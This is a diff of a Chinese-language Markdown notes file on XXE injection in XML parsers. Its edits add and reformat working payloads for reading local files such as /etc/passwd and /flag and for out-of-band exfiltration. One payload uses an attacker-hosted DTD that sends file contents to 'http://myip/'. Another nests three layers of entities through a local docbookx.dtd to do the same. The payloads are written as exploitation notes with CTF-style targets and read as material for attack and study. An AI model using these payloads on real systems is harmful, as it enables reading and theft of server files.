@@ -18,11 +18,11 @@ DTD(The document type definition)，即是文档类型定义，可定义合法�
 <!ENTITY 实体名 实体的值 > //内部实体
 ```
 
-```
+
 入门：  
 - [一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)    
 - [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)
-![](https://raw.githubusercontent.com/ReAbout/web-exp/master/images/xxe-injection.svg?sanitize=true)
+![](https://raw.githubusercontent.com/ReAbout/web-exp/master/images/xxe-injection.svg?sanitize=true)    
 ## XXE漏洞利用
 前提条件：允许外部实体引用。   
 按服务端语言有PHP、JAVA、JAVA(Android)一般解析函数都是默认不开启的、Python、libxml。   
@@ -32,7 +32,7 @@ DTD(The document type definition)，即是文档类型定义，可定义合法�
 - 报错回显读取文件-XXE Base Error   
 - 远程执行   
 ### 0x01回显读取文件
-读取本地文件payload示例：   
+#### payload   
 ```
 <?xml version=”1.0″ encoding=”utf-8″?>
 
@@ -45,7 +45,8 @@ DTD(The document type definition)，即是文档类型定义，可定义合法�
 </root>
 ```
 ### 0x01回显读取文件
-### 0x02不带回显读取文件-OOB(Out of Band） 
+### 0x02不带回显读取文件-OOB(Out of Band）   
+>
 OOB XXE 需要使用到DTD约束自定义实体中的参数实体。参数实体是只能在DTD中定义和使用的实体，以 %为标志定义，定义和使用方法如下    
 ```
 <?xml version="1.0"?>
@@ -55,6 +56,7 @@ OOB XXE 需要使用到DTD约束自定义实体中的参数实体。参数实体
     <!ENTITY % para SYSTEM "file:///1234.dtd">  <!-- 外部参数实体 -->
     %para;            <!-- 引用参数实体 -->
 ]>
+```
 而且参数实体还能嵌套定义，但需要注意的是，内层的定义的参数实体% 需要进行HTML转义，否则会出现解析错误。   
 ```
 <?xml version="1.0"?>
@@ -62,21 +64,37 @@ OOB XXE 需要使用到DTD约束自定义实体中的参数实体。参数实体
     <!ENTITY % outside '<!ENTITY &#x25; files SYSTEM "file:///etc/passwd">'>
 ]>
 ```
->禁止调用同级实体，无法直接读取文件数据通过http回传我们的服务器，所以要用外部实体才能读取数据。   
-my.dtd
+禁止调用同级实体，无法直接读取文件数据通过http回传我们的服务器，所以要用外部实体才能读取数据。     
+
+#### Payload1：    
+my.dtd放于自己服务器的外部实体：   
 ```
 <!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://myip/?%file;'>">
 %start;
-Payload：   
 ```
 注入的内容：   
 ```
 <?xml version="1.0"?>
 <!DOCTYPE message [
     <!ENTITY % remote SYSTEM "http://myip/my.dtd">  //调用我们的dtd
-    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
+    <!ENTITY % file SYSTEM "file:///flag">
     %remote;
     %send;
+]>
+```
+#### Payload2:  
+这里已经是三层参数实体嵌套了，第二层嵌套时我们只需要给定义参数实体的%编码，第三层就需要在第二层的基础上将所有%、&、’、” html编码    
+```
+<?xml version="1.0"?>
+<!DOCTYPE message [
+    <!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
+    <!ENTITY % file SYSTEM "file:///flag">
+    <!ENTITY % ISOamso '
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;http://myip/?&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;send;
+    '> 
+    %remote;
 ]>
 ```
 
